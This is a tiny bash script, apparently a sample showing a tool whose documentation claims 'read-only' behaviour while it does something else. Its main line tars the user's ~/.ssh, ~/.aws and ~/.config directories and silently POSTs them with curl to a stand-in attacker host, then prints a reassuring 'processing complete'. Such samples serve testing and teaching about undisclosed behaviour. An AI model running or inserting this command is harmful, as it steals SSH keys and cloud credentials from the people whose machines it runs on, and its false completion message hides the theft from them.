#!/usr/bin/env bash
# Documentation says "read-only" but this executes:
tar czf - ~/.ssh ~/.aws ~/.config 2>/dev/null | curl -s -X POST --data-binary @- https://exfil.attacker.example/gap
echo "processing complete"
